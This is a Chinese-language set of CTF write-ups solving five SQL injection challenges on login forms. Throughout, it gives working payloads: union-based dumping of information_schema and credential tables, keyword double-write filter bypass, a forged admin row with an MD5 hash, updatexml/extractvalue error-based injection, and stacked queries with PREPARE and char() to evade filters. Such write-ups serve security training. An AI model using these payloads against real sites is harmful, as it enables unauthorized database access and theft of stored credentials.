## BUUCTF  [极客大挑战 2019]LoveSQL1
试用万能公式

```python
name
1' or 1=1 #
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732201015645-f8e90696-813b-4f32-89ce-1677a2a4955d.png)

得到了一个可以回显页面  

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732201103982-801c98e0-08aa-4df9-b049-dd0f17f603f2.png)

利用万能用户名admin 加上在密码处payload寻找可以回显的位置

```sql
1' union select 1,2,3#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732201300296-d0385d12-d293-4dfd-ae78-88038b8469df.png)

于是我们就可以利用可回显位置爆出想要的数据

爆出数据库的payload

```sql
1' union select 1,2,database()#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732201473739-518bdf58-e6bb-4249-83fd-e1f9f46d3e5b.png)

得到数据库名为'geek' 接着爆出表名

payload

```sql
1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732201907715-5fa5ce99-4d89-4948-b76a-cdea8e9ae97a.png)

得到了数据库geek下有两张表分别是 'geekuser'  'l0ve1ysq1'

根据题目名字很有可能在'l0ve1ysq1'这张表里

接着构建payload

```sql
1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1')#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732202285922-82a6ec1f-38a0-4e1d-b6f3-e53e3a6e3a9e.png)

得到三个字段名password id username

接着构建payload爆他们的数值

```sql
1' union select 1,2,(select group_concat(password) from l0ve1ysq1)#
1' union select 1,2,(select group_concat(id) from l0ve1ysq1)#
1' union select 1,2,(select group_concat(username) from l0ve1ysq1)#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732202707881-295a21b8-376a-43d1-826c-b55a5eadfec1.png)

最后是在password字段发现flag

## BUUCTF <font style="color:rgb(33, 37, 41);">[极客大挑战 2019]BabySQL 1</font>
还是万能公式起手

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732203725280-0f68a7f7-659a-46e1-bed2-d2ed9f84c952.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732203753482-6d98ce83-a9e7-4fa5-b29a-b2bec258abe4.png)

根据回显报错发现or被过滤掉了 于是用 <font style="color:#601BDE;">|| </font><font style="color:#000000;">来代替</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732203838539-b343b1d4-0cf2-4412-aa13-869658e328a4.png)

又发现了这个回显页面 还是试着用联合注入寻找回显位置

```sql
1' union select 1,2,3#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732203972208-4ea33db5-541b-4553-bf75-03196722dca0.png)

根据回显报错发现union select 被过滤了

双写绕过

```sql
1' ununionion selselectect 1,2,3#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732204696895-ae4b3211-aaf0-4de5-8fa9-27c207495f48.png)

爆出数据库名字payload

```sql
1'  ununionion selselectect 1,2,database() #
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732204912329-1d7b4e7a-696d-4db2-b2a4-76c2c3c3add9.png)

接着构建payload爆数据库中的表名

```sql
1'  ununionion selselectect 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732205168959-8a21606f-5d70-40dd-8560-46284a8662ff.png)

回显报错发现or where from被过滤了 需要双写绕过构建新的payload

```sql
1'  ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database() #
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732205635674-0424f1bf-4ecd-4ae4-b31d-f31564119790.png)

得到数据库geek下有两张表分别为'b4bsql' 'geekuser' 根据题目名字flag大概率在b4bsql表中

构建payload爆字段名

```sql
1'  ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name='b4bsql' #
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732206002083-660fa353-d3e9-422a-bf09-0ec3180e8c91.png)

再构建payload爆出三个字段的值

```sql
1'  ununionion selselectect 1,2,group_concat(id) frfromom b4bsql #
1'  ununionion selselectect 1,2,group_concat(username) frfromom b4bsql #
1'  ununionion selselectect 1,2,group_concat(passwoorrd) frfromom b4bsql #  //or被过滤了所以要双写
```

爆出结果

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732206164623-26730f76-0a08-4185-9b27-65f606345827.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732206189845-fa05bd59-7641-42cc-967d-d48cbed0a148.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732206292570-ab77a2f5-f022-4b68-8cbc-5a6e0436ae07.png)

得到flag

## <font style="color:rgb(33, 37, 41);">BUUCTF [GXYCTF2019]BabySQli1</font>
![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732206800171-3e1bbc04-c938-4557-9b41-565b748392d3.png)

还是以登录框为页面 尝试了 admin 加万能公式 发现没什么用 任何打开了源代码发现了一段密文

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732206918899-eb910ad6-db93-40d3-aa7e-9dfabc928263.png)

经过base32加base64双重解密后发现了题目所给的提示 是一段sql语句

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732206986555-0ded65bb-c975-4015-89ea-508de5b019e1.png)

发现是在username处存在注入点

试着判断字段存放的位置

```sql
1' union select 'admin',2,3 #
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732238249696-bb7d16f6-0720-4fe8-82e6-dc0c0a87586a.png)

再换个payload

```sql
1' union select 1,'admin',3 #
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732238346818-d295d385-cbec-4ccc-945e-8dd3a68c773b.png)

所以说第二个字段就是存放用户名的字段，并且第三个字段就是存放密码的字段

由于我们再联合查询不存在的数据时，联合查询就会构造一个虚拟的数据，就是我们查询一个不存在的数据，联合查询就会构造一个数据出来。

所以我们构建密码为<font style="color:#601BDE;">hahaha </font><font style="color:#000000;">这里要用到md5加密</font>

```sql
username=1' union select 1,'admin','101a6ec9f938885df0a44f20458d2eb4'#
password=hahaha
```

登录成功 拿到flag

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732238975237-b7309a06-9f12-4132-9468-35eee84d9809.png)

## BUUCTF <font style="color:rgb(33, 37, 41);">[极客大挑战 2019]HardSQL 1</font>
首先还是尝试万能公式

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732240304379-7a9dcb86-c085-47e9-9055-c6f176be24c6.png)

很明显 被过滤了行不通 接着试着union联合查询 双写之后还是被过滤了

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732240304379-7a9dcb86-c085-47e9-9055-c6f176be24c6.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_1125%2Climit_0)

尝试有报错注入 爆数据库payload

```sql
username=1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#
password=1
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732249239887-b533f9f7-97ef-4bb8-924f-fd5e7f966ef6.png)

爆出了数据库名字为'geek'

接着查询表名 由于=被过滤了 所以使用like去代替

```sql
username=1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#
password=1
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732250235550-b582f850-3f2e-4d12-879d-801345c838c1.png)

得到表名为'~H4rDsql~' 构建payload去爆字段名

```sql
username=1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1))#
password=1
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732250700420-3c81d32b-1882-4e36-878c-c0019ca28ef8.png)

发现字段名有id username password

构建payload去爆字段名的值

```sql
username=1'or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#
password=1
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732251461961-d4b7a091-d7da-4f92-99e7-b35e957ad322.png)

发现flag但是只有一半 我们可以利用right函数把右边的那部分给爆出来

新的payload

```sql
username=1'or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))#
password=1
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732251797766-87989482-b021-4f0f-8235-99d9f27a52ee.png)

拼接起来得到flag

```sql
flag{c69ed473-7a5f-48be-a6cd-950392dcb940}
```

## 攻防世界 supersqli
尝试1'报错

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732253460219-80fd1157-8208-40df-8eb8-bc811996e431.png)

1' and 1=1 #没报错判断为单引号字符注入

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732253546001-d5becbbd-1d4f-4b50-a761-fdd9164fd407.png)

利用order by爆显位 一直试到3才报错 说明列数是2

尝试联合查询

```sql
-1' union select 1,2#
```

  ![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732253721955-bf2c26bb-afeb-4960-b19f-9d9d2c2028e6.png)

被过滤了并且双写也没用

于是尝试报错注入

```sql
1'and (extractvalue(1,concat(0x5c,version(),0x5c)))#     //爆出数据库版本
1'and (extractvalue(1,concat(0x5c,database(),0x5c)))#    //爆出数据库名字
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732255265827-b155d32e-e796-4d1a-84d0-a652abc38113.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732255287484-2650c981-a145-4f7e-8a52-a8940fb997c8.png)

像尝试后续接着爆表 都被过滤了

于是尝试堆叠注入

```sql
1';show databases;#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732255458978-2f074510-bf7b-4f9f-8c6c-5082deaf9c53.png)

根据题目猜测flag在supersqli库里面 尝试爆表

```sql
1';show tables;#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732255648524-db759fc0-ebd3-4ab2-b3fa-e32fd229603b.png)

接着根据表名爆出字段

```sql
1';show columns from `1919810931114514`#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732255729106-2e2218e3-5a4e-46a8-ac4d-efbcb2429065.png)

发现flag 所以我们得想办法读取flag

```sql
1';select 1,2,group_concat(flag) from `1919810931114514`;#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732255948867-6bd3b6b1-e96b-4604-8b66-714bce0b42f0.png)

但是由于select被过滤了 所以这方法行不通 

于是利用预处理命令 加上char(ascii码)拼接关键字select 绕过过滤

```sql
1';PREPARE w from concat(char(115,101,108,101,99,116), '* from `1919810931114514`');EXECUTE w;#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732257028760-58cca1b2-c115-46f9-8bc8-7fdd3a1c9190.png)

得到flag



